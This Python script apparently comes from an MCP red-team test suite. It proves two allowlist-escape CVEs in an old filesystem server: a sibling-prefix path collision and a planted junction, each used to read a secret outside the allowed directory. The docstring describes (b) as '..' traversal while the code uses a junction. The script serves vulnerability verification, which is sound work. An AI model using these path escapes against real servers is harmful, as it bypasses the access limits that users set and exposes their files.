"""Deterministic exploit proof: filesystem 0.6.2 allowlist escape.

PASS when read_file reads a file OUTSIDE the allowed dir via (a) sibling
prefix-collision and (b) ``..`` traversal - CVE-2025-53110 / CVE-2025-53109
against the official (old) server-filesystem.

Usage:
    $env:MCPWN_FS_INDEX_OLD = "<server-filesystem@0.6.2 dist/index.js>"
    python eval/real_vuln/prove.py
"""

from __future__ import annotations

import asyncio
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))

from eval.real_vuln._fresh import fresh_fs_vuln_target
from mcp_redteam.targets.mcp_client import McpSession

SECRET = "FS-SECRET-OUTSIDE-2026"


async def main() -> None:
    async with fresh_fs_vuln_target() as url, McpSession(url) as s:
        base = Path(tempfile.gettempdir())
        allowed = base / "mcpwn-fs"
        outside = base / "mcpwn-fs2"

        ok = await s.call_tool("read_file", {"path": str(allowed / "readme.txt")})
        assert "in-sandbox" in ok.result_text, ok.result_text

        via_sibling = await s.call_tool("read_file", {"path": str(outside / "secret.txt")})
        assert SECRET in via_sibling.result_text, via_sibling.result_text
        print(f"PASS (a) sibling prefix-collision read outside allowlist: {SECRET}")

        via_junction = await s.call_tool(
            "read_file", {"path": str(allowed / "evil-junction" / "secret.txt")}
        )
        assert SECRET in via_junction.result_text, via_junction.result_text
        print(f"PASS (b) in-sandbox junction escapes allowlist: {SECRET}")


if __name__ == "__main__":
    asyncio.run(main())
